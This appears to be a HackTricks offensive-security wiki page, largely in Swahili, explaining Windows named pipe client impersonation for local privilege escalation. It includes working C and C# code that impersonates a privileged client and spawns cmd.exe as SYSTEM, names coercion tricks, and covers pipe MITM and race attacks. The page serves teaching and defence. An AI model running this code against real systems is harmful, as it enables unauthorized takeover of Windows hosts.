# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation ni local privilege escalation primitive inayoruhusu thread ya named-pipe server kuchukua security context ya client inayounganishwa nayo. Kwa vitendo, attacker anayeweza kuendesha code akiwa na SeImpersonatePrivilege anaweza kulazimisha privileged client (km. huduma ya SYSTEM) iungane na pipe inayodhibitiwa na attacker, kuita ImpersonateNamedPipeClient, ku-duplika token inayotokana kuwa primary token, na kuanzisha process kama client (mara nyingi NT AUTHORITY\SYSTEM).

Ukurasa huu unalenga technique kuu. Kwa end-to-end exploit chains zinazolazimisha SYSTEM kuelekea pipe yako, angalia kurasa za Potato family zilizorejelewa hapa chini.

## TL;DR
- Create named pipe: \\.\pipe\<random> na subiri connection.
- Fanya privileged component iungane nayo (spooler/DCOM/EFSRPC/etc.).
- Soma angalau message moja kutoka kwenye pipe, kisha ita ImpersonateNamedPipeClient.
- Fungua impersonation token kutoka current thread, DuplicateTokenEx(TokenPrimary), na CreateProcessWithTokenW/CreateProcessAsUser ili kupata SYSTEM process.

## Requirements and key APIs
- Privileges zinazohitajika kwa kawaida na calling process/thread:
- SeImpersonatePrivilege ili kuweza impersonate client inayounganishwa na pia kutumia CreateProcessWithTokenW.
- Vinginevyo, baada ya impersonating SYSTEM, unaweza kutumia CreateProcessAsUser, ambayo inaweza kuhitaji SeAssignPrimaryTokenPrivilege na SeIncreaseQuotaPrivilege (hizi hutimizwa unapokuwa unamimic SYSTEM).
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (lazima usome angalau message moja kabla ya impersonation)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: ili kufanya actions zenye manufaa locally, client lazima iruhusu SecurityImpersonation (default kwa local RPC/named-pipe clients wengi). Clients wanaweza kupunguza hili kwa SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION wakati wa kufungua pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), ensure you read from the pipe first and that the client didn’t restrict impersonation to Identification level.
- Prefer DuplicateTokenEx with SecurityImpersonation and TokenPrimary to create a primary token suitable for process creation.

## .NET quick example
In .NET, NamedPipeServerStream can impersonate via RunAsClient. Once impersonating, duplicate the thread token and create a process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Mbinu hizi hulazimisha huduma zenye privileji kuunganika na named pipe yako ili uweze kuzi-impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Tazama matumizi ya kina na compatibility hapa:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{endref}}

Ikiwa unahitaji tu mfano kamili wa kutengeneza pipe na kufanya impersonation ili kuzindua SYSTEM kutoka kwa service trigger, tazama:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{endref}}
-
{{#ref}}
service-triggers.md
{{endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Wakati service yenye privileji na process isiyo na privileji kubwa zinawasiliana kupitia `\\.\pipe\...`, chukulia pipe kama IPC boundary nyingine yoyote isiyoaminika. Zaidi ya classic server-side impersonation, weak pipe ACLs, unsafe creation flags, na client-side trust decisions vyote vinaweza kuwa local privilege escalation primitives.

### Enumerate candidate pipes first
- Orodhesha pipes haraka kutoka PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` ni muhimu kuona instance counts na single-instance pipes.
- Zingatia majina yanayotumiwa na services zinazoendeshwa kama `SYSTEM`, hasa helpers, updaters, launchers, na UI brokers.

### MITM via permissive DACLs and extra pipe instances
- Process yoyote inayoweza kuzungumza na privileged server tayari inaweza kufuzz protocol yake na kutafuta privileged verbs.
- Kisa cha kuvutia zaidi ni wakati DACL inatoa `FILE_GENERIC_WRITE`/`GENERIC_WRITE` kwenye pipe object. Kwenye named pipes hii inajumuisha kwa njia isiyo ya moja kwa moja `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` hushiriki bit ileile), hivyo attacker anaweza kuunda server instance nyingine yenye jina lilelile.
- Kwa kuwa instances zinalinganishwa kwa FIFO order, attacker-created na legitimate instances zinaweza kuchanganywa: tengeneza rogue instance kwa `CreateNamedPipe`, kisha fungua pipe name ileile kwa `CreateFile`, na subiri real client ifike kwenye rogue server instance.
- Matokeo: observe, modify, relay, au desynchronize privileged IPC bila kuhitaji kumiliki original server process.

### First-instance race on pipe security descriptors
- `lpSecurityAttributes` inaainisha tu DACL wakati first instance ya pipe name inatengenezwa.
- Ikiwa service yenye privileji inaanza kuchelewa na haitumii `FILE_FLAG_FIRST_PIPE_INSTANCE`, attacker anaweza ku-create mapema pipe name kwa permissive DACL, kisha aache service itengeneze instances za baadaye chini ya security context iliyochaguliwa na attacker.
- Hii hugeuza service startup kuwa race condition: shinda first instance, kisha connect au MITM clients za baadaye kwa kutumia ACL iliyodhoofishwa.
- Mitigation kwa defenders, na key review point kwa attackers: angalia kama `CreateNamedPipe(..., dwOpenMode, ...)` inajumuisha `FILE_FLAG_FIRST_PIPE_INSTANCE`. Ikiwa sivyo, jaribu pre-creation kabla service haijaanza.

### PID/signature checks are hardening, not a boundary
- Bidhaa fulani hujaribu kuzuia access kwa kuangalia `GetNamedPipeClientProcessId`, process image path, au Authenticode signer wa client inayounganika.
- Hii husaidia tu hadi uingize code ndani ya legitimate client: ukishakuwa ndani ya trusted process, unarithi PID/image/signature context halisi ambayo server inatarajia.
- Kwa split desktop apps, instrumenting low-privileged UI/helper process mara nyingi ni rahisi kuliko kushambulia `SYSTEM` service moja kwa moja.

### Hook the client according to its I/O model
- Synchronous I/O: intercept `NtWriteFile` kabla syscall haijameza buffer, na inspect/patch `NtReadFile` baada ya kurudi.
- Overlapped I/O: hifadhi `OVERLAPPED`/`IoStatusBlock` iliyoonekana katika `NtReadFile`, kisha inspect buffer baada ya `GetOverlappedResult` au wait husika kukamilika.
- Completion ports: `GetQueuedCompletionStatus` hufikia `NtRemoveIoCompletion`; returned `ApcContext` huunganisha kurudi na `OVERLAPPED` iliyotumiwa na original read, ambayo ndiyo pivot sahihi ya kupata buffer iliyojaa sasa.
- Completion routines (`ReadFileEx`): completion callback hutolewa kama APC. Ikiwa unataka kubadilisha returned data au kuingiza synthetic replies, hook real completion routine na, kwa custom injection, tumia one-argument `QueueUserAPC` dispatcher inayoreconstruct expected arguments 3 za routine.

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) hu-proxy named-pipe traffic kupitia injected helper DLL na hutoa workflow ya aina ya Burp kwa editing/replay.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) inatumia mbinu ya Frida na inalenga hooking `NtReadFile`/`NtWriteFile` pamoja na async/completion pivots hapo juu, kisha kusambaza traffic kwenda kwenye WebSocket-backed editing workflow.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operational considerations
- Named pipes are low-latency; long pauses while editing buffers can deadlock brittle services.
- Overlapped/completion-port/APC-driven clients need different hooks than simple `ReadFile`/`WriteFile` detours.
- Injection into the trusted client is noisy and generally best kept for exploit development, protocol reversing, or local lab fuzzing.

## Troubleshooting and gotchas
- You must read at least one message from the pipe before calling ImpersonateNamedPipeClient; otherwise you’ll get ERROR_CANNOT_IMPERSONATE (1368).
- If the client connects with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, the server cannot fully impersonate; check the token’s impersonation level via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requires SeImpersonatePrivilege on the caller. If that fails with ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser after you already impersonated SYSTEM.
- Ensure your pipe’s security descriptor allows the target service to connect if you harden it; by default, pipes under \\.\pipe are accessible according to the server’s DACL.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
